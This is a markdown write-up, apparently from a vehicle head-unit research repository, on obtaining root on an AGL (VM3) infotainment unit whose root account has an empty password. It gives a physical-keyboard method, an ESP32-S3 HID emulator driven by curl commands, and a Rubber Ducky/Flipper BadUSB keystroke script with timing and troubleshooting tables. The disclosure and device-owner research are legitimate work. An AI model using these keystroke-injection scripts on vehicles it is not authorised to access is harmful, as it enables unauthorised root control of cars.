# AGL root：空密码 + 登录控制台

## 结论

AGL（VM3）的 root 来自一处**账户配置缺陷**，全程不需要改动任何程序：

- `/etc/shadow` 中 root 的密码字段为空；
- 它是系统中**唯一**空密码账户（其余为 `!` 或 `*`）；
- `login` 与 `busybox.suid su` 都接受空密码。

## 证据

```text
# grep '^root:' /etc/shadow
root::20406:0:99999:7:::
```

对比：系统其余账户的密码字段均为 `!`（禁用）或 `*`（无效）。

## 方式 A：物理 USB 键盘

车机有一个升级用的 USB 口，可接 USB 键盘：

```text
USB 键盘 → Alt+F3（或 Ctrl+Alt+F1）→ tty getty
→ 用户名 root
→ 密码：直接回车（空）
→ uid=0(root)
```

## 方式 B：ESP32-S3 USB HID 键盘模拟

> 项目：[esp32-hid-web](https://github.com/vw-id-headunit-lab/esp32-hid-web)
> 作者：[NullYing](https://github.com/NullYing)（vw-id-headunit-lab），感谢分享。

物理键盘需要人在车上；用 ESP32-S3 做 USB HID 键盘，则可以手机/脚本远程完成同样的事。

### 硬件

- ESP32-S3 开发板（建议 16 MB Flash、带**原生 USB/OTG Type-C**，不要求 PSRAM）；
- 一根与开发板、车机匹配的 USB 数据线；
- 车机的 Type-C 口需支持 USB 数据传输与外接键盘。

### 连接

```text
ESP32-S3（原生 USB/OTG）──USB 数据线──> 车机 Type-C
```

手机连热点 `S3-HID-XXXXXX`（默认密码 `esp32hid123`），浏览器打开 `http://192.168.4.1`，
等页面显示「USB 已连接」。

### 输入序列

本平台进控制台用 `Ctrl+Alt+F1`（该项目按键白名单固定提供 `CTRL_ALT_F1`）：

```sh
TOKEN=$(curl -s http://192.168.4.1/api/status | sed -n 's/.*"api_token":"\([^"]*\)".*/\1/p')
H='Content-Type: application/json'
A="X-HID-Token: $TOKEN"

# 1) 切控制台
curl -s -X POST http://192.168.4.1/api/key  -H "$H" -H "$A" -d '{"key":"CTRL_ALT_F1","system":"linux"}'
# 2) 用户名 + 回车
curl -s -X POST http://192.168.4.1/api/type -H "$H" -H "$A" -d '{"text":"root","system":"linux","append_enter":true}'
# 3) 空密码 → 回车
curl -s -X POST http://192.168.4.1/api/key  -H "$H" -H "$A" -d '{"key":"ENTER"}'
```

### 注意事项

| 项 | 说明 |
|---|---|
| 键码差异 | 该项目白名单有 `CTRL_ALT_F1`，**没有 `Alt+F3`**；若固件只认 `Alt+F3` 请用物理键盘 |
| token | 每次启动重新生成，先 `GET /api/status` |
| 请求头 | 必须是 `Content-Type: application/json` + `X-HID-Token`，不启用 CORS |
| 文字上限 | 每次最多 4096 UTF-8 字节 |
| 密码为空 | 不要在 `/api/type` 里给空字符串密码，直接发 `ENTER` |
| 安全性 | 访问控制依赖热点密码/局域网权限；API token 只防跨域提交，不是登录机制 |

---

## 方式 C：可编程键盘 / BadUSB

适合现场、离线、可重复的场景：不需要手机、不需要热点、不需要网络。

### 设备

任何能枚举为 **USB HID 键盘**并回放脚本的设备：

- BadUSB 类设备（Rubber Ducky 兼容脚本）；
- Flipper Zero 的 BadUSB 功能；
- Digispark（ATtiny85）等；
- 支持宏编程的机械键盘。

### 脚本

Rubber Ducky / Flipper BadUSB 语法：

```text
DELAY 3000
CTRL ALT F1
DELAY 1500
STRING root
ENTER
DELAY 800
ENTER
```

若目标固件只认 `Alt+F3`，把第三行改为：

```text
ALT F3
```

### 时序

| 阶段 | 建议延时 | 原因 |
|---|---|---|
| 插入 → 开始发送 | 2–3 s | USB 枚举 + getty 启动 |
| 切 VT → 输入用户名 | 1–1.5 s | 控制台重绘 |
| 输入 root → 密码 | 0.5–1 s | 登录提示 |

太快会丢键，表现为只输入了 `r` 或 `roo`。

### 排错

| 现象 | 可能原因 |
|---|---|
| 完全没反应 | 设备以存储模式枚举，未切 HID；或车机口不支持键盘 |
| 只输入了部分字符 | 延时太短 |
| 切不到控制台 | 该固件不吃 `Ctrl+Alt+F1`，改 `Alt+F3` 或反过来 |
| 到了登录界面但登不进去 | 密码不是空、或该账户被锁定；先确认 `/etc/shadow` |
## 为什么这是配置缺陷

- 空密码账户本身是镜像配置问题；
- 登录控制台默认存在，只是没有键盘时不可达；
- 厂商默认关闭了网络侧 22 端口（`iptables` 未放行），因此空密码无法从网络直达。

一旦同时满足"空密码 + 可触达的控制台"，root 就成立。

## 取得 root 之后

本仓库不在此步骤写入任何持久化内容；持久化见 [persistence.md](persistence.md)。

## 风险与边界

- 该缺陷属于**厂商配置问题**，修复方式是为 root 设置密码或禁用空密码登录；
- 公开此信息用于研究与自设备维护；
- 不建议在任何非本人设备上使用。

---

